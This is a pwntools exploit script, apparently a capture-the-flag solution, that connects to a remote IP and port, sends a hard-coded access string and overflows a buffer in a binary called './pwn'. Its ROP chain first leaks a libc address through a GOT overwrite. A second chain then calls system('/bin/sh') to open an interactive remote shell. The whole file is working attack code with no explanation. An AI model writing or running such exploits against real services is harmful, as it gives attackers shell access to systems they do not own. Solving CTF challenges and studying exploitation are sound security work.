# file_store

from pwn import *

elfname = './pwn'
libcname = './libc.so.6'

p = remote('39.104.19.209', 32223)
elf = ELF(elfname)
libc = ELF(libcname)

context.log_level = 'debug'
context.arch = 'amd64'
context.binary = elfname




r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
c = lambda: p.close()
li = lambda x: log.info(x)
db = lambda: gdb.attach(p)
uu32 = lambda data: u32(data.ljust(4, '\x00'))
uu64 = lambda data: u64(data.ljust(8, '\x00'))

loginfo = lambda tag, addr: log.success(tag + " -> " + hex(addr))
#gdb.attach(p,'b * 0x400A83')
p.send('{>o<fi:`mjkj5daqd6fhugim~~rj5h='.ljust(0x20,'\x00'))
poprdi=0x0000000000400af3
poprsi=0x0000000000400af1
payload='c'*0x30+p64(0x601e00)+p64(poprdi)+p64(0)+p64(poprsi)+p64(0x601058)*2+p64(elf.plt['read'])
payload+=p64(poprdi)+p64(elf.got['strlen'])+p64(elf.plt['setvbuf'])+p64(0x400A64)
sl(payload)
sleep(4)
p.send('\x70\x09')
libcbase=u64(p.recv(6).ljust(8,'\x00'))-0x18e450
loginfo("libc",libcbase)
system=libcbase+libc.sym['system']
binsh=libcbase+libc.search("/bin/sh").next()
p.send('{>o<fi:`mjkj5daqd6fhugim~~rj5h='.ljust(0x20,'\x00'))
payload='a'*0x30+p64(0x601e00)+p64(poprdi+1)+p64(poprdi)+p64(binsh)+p64(system)
p.send(payload)
p.interactive()